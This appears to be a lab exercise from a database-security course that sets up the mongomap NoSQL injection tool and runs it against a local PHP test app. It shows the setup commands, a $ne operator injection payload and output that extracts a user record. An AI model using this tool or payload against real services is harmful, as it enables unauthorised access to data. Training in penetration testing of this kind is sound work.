# DBSec10 - prepare noSQL injection with mongomap

mongomap can be used as noSQL injection penetration test tool

all actions on OpenStack platform as superuser
```bash
sudo -s
cd /usr/local/src
git clone https://github.com/Hex27/mongomap.git
cd mongomap
# colorama is a module, which mongomap depends on
pip3 install colorama
# there is a bug in the regexArrayBlindInjection file, which needs to be marked as regex with an "r" prefix
sed -i 's/charset = "abcdefghijklmnopqrstuvwxyz/charset = r"abcdefghijklmnopqrstuvwxyz/' tests/regexArrayBlindInjection.py
python3 mongomap.py -u http://localhost/php-quickstart/quickstart.php --method post --data "name=dummy&course=unknown"
```

expected output is, that the first user is found and both parameters are classified as being injectable

>[*] Test phase completed.<br>
><br>
>[+] Vulnerable Parameters:<br>
>[+] name<br>
>[+] - Not-Equals Array (param[$ne]) Injection<br>
>[+] course<br>
>[+] - Not-Equals Array (param[$ne]) Injection<br>
><br>
>[i] Attempting to dump data...<br>
>[*] Parameter: name<br>
><br>
>[*] Attemping dump with Not-Equals Array (param[$ne]) Injection on param name<br>
><br>
><br>
>[+] Not-Equals Array (param[$ne]) Injection for name has retrieved:<br>
>[+]<br>
>[+]     For payload: name[$ne]=admin&course[$ne]=dummy<br>
>[+]<br>
>[+]     Content Difference:<br>
>[+]     Welcome, John Doe!<br>
>[+]
 